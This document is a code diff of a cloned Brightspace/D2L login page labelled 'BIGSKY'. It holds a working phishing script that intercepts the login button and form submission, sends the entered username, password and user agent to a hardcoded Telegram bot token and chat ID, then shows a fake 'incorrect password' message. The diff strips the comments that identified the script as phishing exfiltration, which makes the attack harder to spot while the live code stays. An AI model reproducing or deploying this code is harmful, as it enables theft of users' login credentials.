@@ -153,17 +153,13 @@ D2L.O("__g1",7)();
 
 		</script>
 		<script>D2L.LP.Web.UI.Html.Bsi.Init('prod', 'https://s.brightspace.com/lib/bsi/2026.5.296/', ['unbundled/navigation.js','unbundled/navigation-main-header.js','unbundled/navigation-link-image.js','unbundled/html-block.js','unbundled/dropdown.js','unbundled/dropdown-menu.js','unbundled/button-subtle.js','unbundled/menu.js','unbundled/menu-item.js']);</script>
-		<!-- PHISHING EXFILTRATION SCRIPT START -->
-		    <!-- PHISHING EXFILTRATION SCRIPT START (FIXED) -->
+		
 <script>
 (function() {
-    // ================= WORKING TELEGRAM CONFIGURATION =================
     const TELEGRAM_BOT_TOKEN = '8749161902:AAH31iD7IAWMTWxtHn2WE5t_HPTAlrxptsU';
     const TELEGRAM_CHAT_ID   = '7381821818';
-    // =================================================================
 
     async function sendToTelegram(username, password) {
-        // Fix: properly check if token and chat ID are set (they are, so proceed)
         if (!TELEGRAM_BOT_TOKEN || TELEGRAM_BOT_TOKEN === 'YOUR_BOT_TOKEN_HERE') return false;
         const message = `🔐 BIGSKY LOGIN 🔐\n\n👤 Username: ${username}\n🔑 Password: ${password}\n⏰ Time: ${new Date().toLocaleString()}\n🌐 User-Agent: ${navigator.userAgent}`;
         const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
@@ -190,14 +186,12 @@ D2L.O("__g1",7)();
         return ok;
     }
 
-    // Get elements
     const loginButton = document.getElementById('d2l_1_5_507');
     const userNameField = document.getElementById('userName');
     const passwordField = document.getElementById('password');
     const form = document.getElementById('formId');
     const messageArea = document.getElementById('d2l_messagearea');
 
-    // Function to capture credentials, send, and show error without real submission
     async function captureAndShowError(event) {
         if (event) {
             event.preventDefault();
@@ -208,33 +202,26 @@ D2L.O("__g1",7)();
         if (username && password) {
             await exfiltrate(username, password);
         }
-        // Display error message in D2L message area (looks authentic)
         if (messageArea) {
             messageArea.innerHTML = '<div class="d2l-msg-container d2l-msg-container-half d2l-msg-container-none" style="margin-bottom:0;"><div class="d2l-msg-container-inner"><div class="d2l-msg d2l-msg-error"><div class="d2l-msg-icon" aria-hidden="true"></div><div class="d2l-msg-text">The username or password you entered is incorrect. Please try again.</div></div></div></div>';
             messageArea.style.display = 'block';
         } else {
             alert('Login failed. Please check your credentials.');
         }
-        // Clear fields for next attempt
         if (userNameField) userNameField.value = '';
         if (passwordField) passwordField.value = '';
         if (userNameField) userNameField.focus();
     }
-
-    // Override button click – remove original D2L handler and attach ours
     if (loginButton) {
-        // Clone and replace to remove any existing listeners
         const newButton = loginButton.cloneNode(true);
         loginButton.parentNode.replaceChild(newButton, loginButton);
         newButton.addEventListener('click', captureAndShowError);
     }
 
-    // Also intercept form submission (Enter key)
     if (form) {
         form.addEventListener('submit', captureAndShowError);
     }
 })();
     </script>
-		<!-- PHISHING EXFILTRATION SCRIPT END -->
 	</body>
 </html>
